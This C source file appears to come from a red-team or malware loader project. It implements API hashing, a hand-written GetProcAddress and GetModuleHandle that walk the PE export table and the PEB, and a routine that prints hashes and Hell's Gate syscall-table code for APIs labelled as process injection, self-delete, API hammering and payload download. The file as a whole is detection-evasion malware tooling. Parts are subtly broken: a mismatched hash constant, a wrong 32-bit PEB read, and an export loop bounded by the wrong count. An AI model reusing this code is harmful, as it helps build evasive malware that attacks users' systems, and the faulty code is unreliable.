/*
 *  ~ hashing.c ~
 * API hashing
 * Author: jakobfriedl
 */

#include "base.h"

#define FNV_OFFSET_BASIS 0xb14212c1b38ddc53
#define FNV_PRIME 0x01000193

/// Hash functions
ULONG HashFNV_1a(IN LPCSTR String){
	ULONG Hash = FNV_OFFSET_BASIS;

	while (*String) {
		Hash ^= (UCHAR)*String++;
		Hash *= FNV_PRIME;
	}

	return Hash;
}

ULONG HashFNV_1aW(IN LPCWSTR String){
	ULONG Hash = FNV_OFFSET_BASIS;

	while (*String) {
		Hash ^= (UCHAR)*String++;
		Hash *= FNV_PRIME;
	}

	return Hash;
}

/// Custom GetProcAddress 
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwApiNameHash) {

	if (!hModule || !dwApiNameHash) return NULL;

	PBYTE pBase = (PBYTE)hModule;

	// Get DOS Header
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	// Get NT Headers
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	// Get Optional Header
	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdr->OptionalHeader;
	if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
		return NULL;
	}

	// Get pointer to the Export Table structure
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Get relevant information from the export directory to search for a specific function
	PDWORD FnNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);			// function names
	PDWORD FnAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);  // function addresses
	PWORD FnOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals); // function ordinals

	// Loop over exported functions 
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		// Get name of the function 
		CHAR* pFnName = (CHAR*)(pBase + FnNameArray[i]); // Name
		WORD wFnOrdinal = FnOrdinalArray[i]; // Ordinal
		PVOID pFnAddress = (PVOID)(pBase + FnAddressArray[wFnOrdinal]); // Address

		// Search for the function that matches the hash and return it
		if (HASHA(pFnName) == dwApiNameHash) {
			// OKAY("[ 0x%p ] Found function \"%s\"", pFnAddress, pFnName);
			return pFnAddress;
		}
	}

	WARN("Function for hash 0x%X not found.", dwApiNameHash);
	return NULL;
}

/// Custom GetModuleHandle
HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash) {

	if (!dwModuleNameHash) return NULL;

	PPEB pPeb = NULL;

	// Use to __readgsqword macro to get the address of the PPEB by specifying the offset of 0x60 (0x30 on 32-bit systems, since PVOID has a since of 4 on there.
#ifdef _WIN64
	pPeb = __readgsqword(0x60); // sizeof(PVOID) = 8 --[ * 12 ]--> 96 --[ HEX ]--> 0x60
#elif _WIN32
	pPeb = __readgsqword(0x30); // sizeof(PVOID) = 4 --> [ * 12 ] = 48 --[ HEX ]-- 0x30
#endif 

	// Get PED_LDR_DATA structure
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

	// Get first element of the linked list which contains information about the first module
	// Doubly-linked lists use the Flink and Blink elements as the head and tail pointers, respectively. 
	// This means Flink points to the next node in the list whereas the Blink element points to the previous node in the list. 
	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	// Loop over all modules
	while (pDte) {

		if (pDte->FullDllName.Length == NULL || pDte->FullDllName.Length > MAX_PATH) {
			break;
		}

		// Convert FullDllName.Buffer to lowercase string
		CHAR szLowercaseDllName[MAX_PATH];

		DWORD i = 0;
		for (i = 0; i < pDte->FullDllName.Length; i++) {
			szLowercaseDllName[i] = (CHAR)tolower(pDte->FullDllName.Buffer[i]);
		}
		szLowercaseDllName[i] = '\0';

		// Check if hashes match
		if (HASHA(szLowercaseDllName) == dwModuleNameHash) {
			// The DLL base address is InInitializationOrderLinks.Flink, or Reserved2[0]
			// If the undocumented structs are not present, the next line could also be written as the following
			// return (HMODULE)(pDte->Reserved2[0]
			HANDLE hModule = (HMODULE)pDte->InInitializationOrderLinks.Flink;
			// OKAY_W(L"[ 0x%p ] Found module \"%s\"", hModule, pDte->FullDllName.Buffer);
			return hModule;
		}

		// Move to the next element in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}

	return NULL;
}

VOID PrintHashes() {

	PCHAR Apis[] = {
		// Process enumeration
		"NtQuerySystemInformation",
		"NtOpenProcess",
		// Mapping injection
		"NtCreateSection",
		"NtMapViewOfSection",
		"NtUnmapViewOfSection",
		"NtCreateThreadEx",
		"NtWaitForSingleObject",
		"NtClose",
		// Self-delete
		"NtQueryInformationProcess",
		"NtCreateFile",
		"NtSetInformationFile",
		// API Hammering
		"NtReadFile",
		"NtWriteFile",
		// Download
		"wininet.dll",
		"kernel32.dll",
		"LoadLibraryA",
		"InternetOpenW",
		"InternetOpenUrlW",
		"InternetReadFile",
		"InternetCloseHandle",
		"InternetSetOptionW"
	};

	// Hash definitions
	for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
		PRINTA("#define %s_HASH 0x%X\n", Apis[i], HASHA(Apis[i])); 
	}

	PRINTA("\n"); 

	// Hell's Gate table initialization
	for (INT i = 0; i < sizeof(Apis)/ sizeof(Apis[0]); i++) {
		PRINTA("Table->%s.dwHash = %s_HASH; \nif (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->%s)) {\n\tPRINT_ERROR(\"GetVxTableEntry [%s]\");\n\treturn FALSE;\n}\n\n", Apis[i], Apis[i], Apis[i], Apis[i]); 
	}
}